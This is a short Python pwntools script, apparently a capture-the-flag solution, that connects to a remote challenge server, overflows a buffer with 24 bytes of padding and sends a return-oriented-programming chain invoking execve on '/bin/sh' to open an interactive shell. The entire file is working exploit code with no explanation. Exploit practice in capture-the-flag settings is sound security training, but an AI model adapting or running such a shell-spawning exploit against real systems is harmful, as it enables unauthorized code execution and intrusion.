from pwn import *

# r = process('./chal')
r = remote('10.113.184.121', 10052)
context.arch = 'amd64'

string_bin_sh = 0x0000000000498027
pop_rax_ret = 0x0000000000450087
pop_rdi_ret = 0x0000000000401f0f
pop_rsi_ret = 0x0000000000409f7e
pop_rdx_pop_rbx_ret = 0x0000000000485e0b
syscall = 0x0000000000401cc4

rop_chain = flat(
    pop_rax_ret, 0x3b,
    pop_rdi_ret, string_bin_sh,
    pop_rsi_ret, 0,
    pop_rdx_pop_rbx_ret, 0, 0,
    syscall
)

r.recvline()
r.recvuntil(b'> ')
raw_input()
r.sendline(b'a' * 24 + rop_chain)


r.interactive()